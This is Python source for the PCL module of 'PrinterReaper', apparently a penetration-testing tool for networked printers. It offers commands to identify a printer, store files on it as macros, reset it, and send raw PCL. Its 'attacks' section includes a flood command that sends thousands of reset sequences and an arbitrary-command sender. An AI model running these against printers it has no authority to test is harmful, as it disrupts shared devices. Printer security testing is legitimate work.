#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PCL Module for PrinterReaper v2.4.0
===================================
Complete PCL (Printer Command Language) penetration testing module

Based on PRET pcl.py but enhanced for PrinterReaper
"""

import re
import os
import random
import time

from core.printer import printer
from utils.helper import log, output, conv, file, item, const as c


class pcl(printer):
    """
    PCL shell for PrinterReaper - Complete Implementation
    """

    def __init__(self, args):
        super().__init__(args)
        self.prompt = f"{self.target}:pcl> "
        self.macros = {}  # Track macros for virtual filesystem

    # --------------------------------------------------------------------
    # Help overview (category-based, PJL-style)
    # --------------------------------------------------------------------
    def do_help(self, arg):
        """Show help for commands (PCL)"""
        topic = (arg or "").strip()
        if topic:
            # Delegate to base generic help for specific topics
            return super().do_help(topic)

        categories = {
            "information": [
                "id", "info", "selftest"
            ],
            "virtualfs": [
                "ls", "put", "get", "delete"
            ],
            "control": [
                "reset", "formfeed", "copies"
            ],
            "attacks": [
                "flood", "execute"
            ],
        }

        implemented = {name for name in dir(self) if name.startswith("do_")}
        def exists(cmd):
            return f"do_{cmd}" in implemented

        print()
        print("PrinterReaper - PCL Commands")
        print("=" * 70)
        print("Available command categories:")
        total = 0
        for cat, cmds in categories.items():
            avail = [c for c in cmds if exists(c)]
            total += len(avail)
            label = cat.ljust(13)
            print(f"  {label}- {len(avail)} commands")
        print()
        print(f"Total: {total} PCL commands available")
        print("Use 'help <command>' for specific details")
        print()
        for cat, cmds in categories.items():
            avail = [c for c in cmds if exists(c)]
            if not avail:
                continue
            print(cat.capitalize() + ":")
            print("-" * 70)
            colw = max(len(x) for x in avail) + 2
            cols = max(1, 70 // colw)
            for i in range(0, len(avail), cols):
                row = avail[i:i+cols]
                print("".join(x.ljust(colw) for x in row))
            print()

    # --------------------------------------------------------------------
    # Low-level PCL send/receive
    
    def cmd(self, str_send, wait=True, crop=True, binary=False):
        """
        Send a PCL command and optionally wait for its reply.
        """
        token = "PCLECHO -" + str(random.randrange(2**16))
        footer = c.ESC + f"*s-{random.randrange(2**16)}X" if wait else ""
        payload = c.UEL + c.PCL_HEADER + str_send + footer + c.UEL

        # log the command
        log().write(self.logfile, str_send + os.linesep)
        # send
        self.send(payload)

        if not wait:
            return ""

        # receive until token with timeout
        try:
            if hasattr(self.conn, '_sock') and self.conn._sock:
                self.conn._sock.settimeout(30.0)
            
            raw = self.recv(re.escape(token) + r".*$", wait, True, binary)
        except Exception as e:
            output().errmsg(f"Failed to receive response: {str(e)}")
            return ""
        
        return raw

    def on_connect(self, mode):
        """
        Initialize PCL environment on first connect.
        """
        if mode == "init":
            # Enter PCL mode
            self.cmd(c.ESC + "E", False)  # PCL reset

    # --------------------------------------------------------------------
    # 📋 SYSTEM INFORMATION COMMANDS
    # --------------------------------------------------------------------

    def do_id(self, *args):
        "Show printer identification (PCL-specific)"
        print("PCL Printer Identification:")
        print("=" * 60)
        
        # Get printer information via PCL
        result = self.cmd(c.ESC + "*s1M" + c.ESC + "*s0M")  # Enter/exit config
        if result:
            print(f"Response: {result}")

    def help_id(self):
        """Show help for id command"""
        print()
        print("id - Show PCL printer identification")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Displays printer identification using PCL commands.")
        print()
        print("USAGE:")
        print("  id")
        print()

    def do_selftest(self, *arg):
        "Perform printer self-test"
        output().message("Initiating PCL self-test...")
        self.cmd(c.ESC + "z")  # Self-test
        output().message("Self-test initiated")

    def help_selftest(self):
        """Show help for selftest command"""
        print()
        print("selftest - Perform PCL self-test")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Triggers the printer's built-in self-test routine.")
        print()
        print("USAGE:")
        print("  selftest")
        print()

    # --------------------------------------------------------------------
    # 📁 VIRTUAL FILESYSTEM (PCL Macros)
    # --------------------------------------------------------------------

    def do_ls(self, arg):
        "List PCL macros (virtual filesystem)"
        if not self.macros:
            output().info("No macros stored (virtual filesystem empty)")
            return
        
        print("PCL Macros (Virtual Files):")
        print("=" * 60)
        for macro_id, info in sorted(self.macros.items()):
            name = info.get('name', 'unnamed')
            size = info.get('size', 0)
            print(f"Macro {macro_id:5d}  {size:8d} bytes  {name}")

    def help_ls(self):
        """Show help for ls command"""
        print()
        print("ls - List PCL macros (virtual filesystem)")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  PCL doesn't have a real filesystem, but macros can be used")
        print("  to store data virtually. This lists all stored macros.")
        print()
        print("USAGE:")
        print("  ls")
        print()
        print("NOTES:")
        print("  - Each macro is like a virtual file")
        print("  - Macros persist until printer reset")
        print()

    def do_put(self, arg):
        "Upload file as PCL macro"
        if not arg:
            output().errmsg("Usage: put <local_file>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        data = file().read(arg)
        if not data:
            return
        
        # Assign macro ID
        macro_id = len(self.macros) + 1000
        
        # Create macro with file data
        macro_cmd = c.ESC + f"&f{macro_id}y{len(data)}X" + data.decode('latin-1', errors='ignore')
        self.cmd(macro_cmd, False)
        
        # Track macro
        self.macros[macro_id] = {
            'name': os.path.basename(arg),
            'size': len(data)
        }
        
        output().message(f"Uploaded {arg} as macro {macro_id}")

    def help_put(self):
        """Show help for put command"""
        print()
        print("put - Upload file as PCL macro")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Stores a local file as a PCL macro on the printer.")
        print("  PCL macros serve as a virtual filesystem.")
        print()
        print("USAGE:")
        print("  put <local_file>")
        print()
        print("EXAMPLES:")
        print("  put document.txt             # Store as macro")
        print("  put data.bin                 # Store binary data")
        print()

    def do_get(self, arg):
        "Download PCL macro"
        if not arg:
            output().errmsg("Usage: get <macro_id>")
            return
        
        try:
            macro_id = int(arg)
        except ValueError:
            output().errmsg("Macro ID must be numeric")
            return
        
        # Request macro execution/output
        result = self.cmd(c.ESC + f"&f{macro_id}X")
        if result:
            info = self.macros.get(macro_id, {})
            name = info.get('name', f"macro_{macro_id}.dat")
            file().write(name, result.encode())
            output().message(f"Downloaded macro {macro_id} to {name}")

    def help_get(self):
        """Show help for get command"""
        print()
        print("get - Download PCL macro")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Retrieves a PCL macro from the printer.")
        print()
        print("USAGE:")
        print("  get <macro_id>")
        print()
        print("EXAMPLES:")
        print("  get 1000                     # Download macro 1000")
        print()

    def do_delete(self, arg):
        "Delete PCL macro"
        if not arg:
            output().errmsg("Usage: delete <macro_id>")
            return
        
        try:
            macro_id = int(arg)
        except ValueError:
            output().errmsg("Macro ID must be numeric")
            return
        
        # Delete macro
        self.cmd(c.ESC + f"&f{macro_id}d1X")
        if macro_id in self.macros:
            del self.macros[macro_id]
        output().message(f"Deleted macro {macro_id}")

    # --------------------------------------------------------------------
    # 📊 PCL INFORMATION COMMANDS
    # --------------------------------------------------------------------

    def do_info(self, arg):
        "Get PCL information"
        if not arg:
            print("Available info categories:")
            print("  fonts      - Show installed fonts")
            print("  macros     - Show installed macros")
            print("  patterns   - Show user-defined patterns")
            print("  symbols    - Show symbol sets")
            print("  extended   - Show extended fonts")
            return
        
        if arg == "fonts":
            result = self.cmd(c.ESC + "*s1T")  # Font list
            print("Installed Fonts:")
            print(result if result else "No information available")
        elif arg == "macros":
            self.do_ls("")
        elif arg == "patterns":
            output().info("Pattern information not directly queryable in PCL")
        elif arg == "symbols":
            output().info("Symbol set information not directly queryable in PCL")
        elif arg == "extended":
            output().info("Extended font information not directly queryable in PCL")

    def help_info(self):
        """Show help for info command"""
        print()
        print("info - Get PCL information")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Retrieves various types of information from PCL printer.")
        print()
        print("USAGE:")
        print("  info <category>")
        print()
        print("CATEGORIES:")
        print("  fonts      - Installed fonts")
        print("  macros     - Stored macros")
        print("  patterns   - User patterns")
        print("  symbols    - Symbol sets")
        print()

    # --------------------------------------------------------------------
    # ⚙️ PCL CONTROL COMMANDS
    # --------------------------------------------------------------------

    def do_reset(self, *arg):
        "Reset printer to default state"
        output().warning("Resetting printer...")
        self.cmd(c.ESC + "E")  # PCL reset
        self.macros = {}  # Clear macro tracking
        output().message("Printer reset")

    def help_reset(self):
        """Show help for reset command"""
        print()
        print("reset - Reset printer to default state")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends PCL reset command, clearing all macros and settings.")
        print()
        print("USAGE:")
        print("  reset")
        print()

    def do_formfeed(self, *arg):
        "Eject current page"
        self.cmd(c.ESC + "&l0H")  # Formfeed
        output().message("Page ejected")

    def do_copies(self, arg):
        "Set number of copies"
        if not arg:
            output().errmsg("Usage: copies <number>")
            return
        
        try:
            num = int(arg)
            self.cmd(c.ESC + f"&l{num}X")
            output().message(f"Copies set to {num}")
        except ValueError:
            output().errmsg("Number of copies must be numeric")

    def help_copies(self):
        """Show help for copies command"""
        print()
        print("copies - Set number of copies")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sets the number of copies to print.")
        print()
        print("USAGE:")
        print("  copies <number>")
        print()
        print("EXAMPLES:")
        print("  copies 5                     # Print 5 copies")
        print()

    # --------------------------------------------------------------------
    # 💥 PCL ATTACK COMMANDS
    # --------------------------------------------------------------------

    def do_flood(self, arg):
        "Flood printer with PCL commands"
        size = conv().int(arg) or 10000
        output().warning(f"Flooding with {size} PCL commands...")
        
        flood_cmd = (c.ESC + "E") * size
        self.cmd(flood_cmd, False)
        output().message("Flood sent")

    def help_flood(self):
        """Show help for flood command"""
        print()
        print("flood - Flood printer with PCL commands")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends a large number of PCL reset commands to test")
        print("  for buffer overflow vulnerabilities.")
        print()
        print("USAGE:")
        print("  flood [size]")
        print()
        print("EXAMPLES:")
        print("  flood                        # Flood with 10000 commands")
        print("  flood 50000                  # Larger flood test")
        print()

    def do_execute(self, arg):
        "Execute arbitrary PCL command"
        if not arg:
            output().errmsg("Usage: execute <pcl_sequence>")
            return
        
        # Interpret escape sequences
        pcl_cmd = arg.replace("\\e", c.ESC).replace("<Esc>", c.ESC)
        result = self.cmd(pcl_cmd)
        if result:
            print("Output:")
            print(result)

    def help_execute(self):
        """Show help for execute command"""
        print()
        print("execute - Execute arbitrary PCL command")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends raw PCL escape sequences to the printer.")
        print()
        print("USAGE:")
        print("  execute <pcl_sequence>")
        print()
        print("EXAMPLES:")
        print("  execute \\eE                  # Reset (use \\e for ESC)")
        print("  execute \\e&l1H               # Eject page")
        print()
        print("NOTES:")
        print("  - Use \\e to represent ESC character")
        print("  - Requires PCL knowledge")
        print("  - May crash printer if invalid")
        print()

